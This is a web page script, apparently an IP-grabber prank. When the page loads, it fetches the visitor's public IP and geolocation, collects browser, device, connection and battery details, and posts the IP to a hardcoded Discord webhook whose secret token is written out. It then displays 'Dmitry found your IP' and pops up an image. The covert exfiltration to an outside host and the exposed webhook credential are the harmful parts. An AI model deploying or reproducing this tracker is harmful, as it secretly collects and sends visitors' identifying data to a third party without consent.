const sendIP = () => {
  let ipadd, geoData;
  let userAgent, language, screenSize, timezone, tzOffset, platform, currentURL, cookiesEnabled, dnt, hardwareConcurrency, deviceMemory;
  let effectiveType, downlink, rtt;
  let batteryInfo = 'unsupported';

  fetch('https://api.ipify.org?format=json')
    .then(ipResponse => ipResponse.json())
    .then(ipData => {
      ipadd = ipData.ip;
      return fetch(`https://ipapi.co/${ipadd}/json/`);
    })
    .then(geoResponse => geoResponse.json())
    .then(async geo => {
      geoData = geo;

      // Browser info
      userAgent = navigator.userAgent;
      language = navigator.language || navigator.userLanguage;
      screenSize = `${window.screen.width}x${window.screen.height}`;
      timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
      tzOffset = -new Date().getTimezoneOffset() / 60;
      platform = navigator.platform;
      currentURL = window.location.href;
      cookiesEnabled = navigator.cookieEnabled;
      dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack || 'unspecified';
      hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
      deviceMemory = navigator.deviceMemory || 'unknown';

      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
      effectiveType = connection.effectiveType || 'unknown';
      downlink = connection.downlink || 'unknown';
      rtt = connection.rtt || 'unknown';

      if (navigator.getBattery) {
        try {
          const battery = await navigator.getBattery();
          batteryInfo = `Level: ${(battery.level * 100).toFixed(0)}%, Charging: ${battery.charging}`;
        } catch {
          batteryInfo = 'error retrieving';
        }
      }

      // Compose Discord message
      const content = `@here\n\n**Visitor Info:**\n` +
        `> **IP Address >>** \`${ipadd}\``;
      /*
        \n` +
        `> **Network >>** \`${geoData.network || 'N/A'}\`\n` +
        `> **City >>** \`${geoData.city || 'N/A'}\`\n` +
        `> **Region >>** \`${geoData.region || 'N/A'}\`\n` +
        `> **Country >>** \`${geoData.country_name || 'N/A'}\`\n` +
        `> **Postal Code >>** \`${geoData.postal || 'N/A'}\`\n` +
        `> **Latitude >>** \`${geoData.latitude || 'N/A'}\`\n` +
        `> **Longitude >>** \`${geoData.longitude || 'N/A'}\`\n\n` +
        `**Browser Info:**\n` +
        `> **User Agent >>** \`${userAgent}\`\n` +
        `> **Language >>** \`${language}\`\n` +
        `> **Screen Size >>** \`${screenSize}\`\n` +
        `> **Timezone >>** \`${timezone} (UTC${tzOffset >= 0 ? '+' : ''}${tzOffset})\`\n` +
        `> **Platform >>** \`${platform}\`\n` +
        `> **Page URL >>** \`${currentURL}\`\n` +
        `> **Cookies Enabled >>** \`${cookiesEnabled}\`\n` +
        `> **Do Not Track >>** \`${dnt}\`\n` +
        `> **CPU Cores >>** \`${hardwareConcurrency}\`\n` +
        `> **Device Memory (GB) >>** \`${deviceMemory}\`\n` +
        `> **Connection Type >>** \`${effectiveType}\`\n` +
        `> **Downlink (Mbps) >>** \`${downlink}\`\n` +
        `> **RTT (ms) >>** \`${rtt}\`\n` +
        `> **Battery Info >>** \`${batteryInfo}\`
      */

      const payload = {
        username: "hooker",
        avatar_url: "https://as1.ftcdn.net/v2/jpg/00/93/61/60/1000_F_93616010_idcUc66pfMbRehwS3xMOXcV7IoOsUdY2.jpg",
        content: content
      };

      const dscURL = 'https://discord.com/api/webhooks/1375900919467737118/w_dWnMR2a_wGzhEbY4EXL3GdYas39mtjY2TKcQOjZ_Sz6yuwehvRwccluZ7r3O-C5pWh';

      const response = await fetch(dscURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      // Format data for on-screen display
      const infoArray = [
        ["IP Address", ipadd]
      ];
      /*
        ["Network", geoData.network],
        ["City", geoData.city],
        ["Region", geoData.region],
        ["Country", geoData.country_name]
        ["Postal Code", geoData.postal],
        ["Latitude", geoData.latitude],
        ["Longitude", geoData.longitude],
        ["User Agent", userAgent],
        ["Language", language],
        ["Screen Size", screenSize],
        ["Timezone", `${timezone} (UTC${tzOffset >= 0 ? '+' : ''}${tzOffset})`],
        ["Platform", platform],
        ["Page URL", currentURL],
        ["Cookies Enabled", cookiesEnabled],
        ["Do Not Track", dnt],
        ["CPU Cores", hardwareConcurrency],
        ["Device Memory", `${deviceMemory} GB`],
        ["Connection Type", effectiveType],
        ["Downlink", `${downlink} Mbps`],
        ["RTT", `${rtt} ms`],
        ["Battery Info", batteryInfo]
      */

      let writeToPage = '';
	  writeToPage += `<h3><strong>Dmitry found your IP:</strong></h3>\n`;
      infoArray.forEach(([key, value]) => {
        writeToPage += `${key}: ${value || 'N/A'}\n`;
      });

      document.getElementById("visitorInfoBox").innerHTML = writeToPage;

      if (response.ok) {
        console.log("✅ Sent complete visitor info!");
      } else {
        console.error("❌ Failed to send", response.status);
      }
    })
    .catch(error => {
      console.error("❌ Error:", error);
    });
};

sendIP();

// Show background overlay after 5 seconds
setTimeout(() => {
  document.getElementById("backgroundOverlay").style.display = "block";
}, 5000);

// Show Hagrid image after 8 seconds
setTimeout(() => {
  const popup = document.getElementById("imagePopup");
  const img = document.getElementById("popupImage");
  img.src = "/Hagrid.png";
  popup.style.display = "block";
}, 8000);
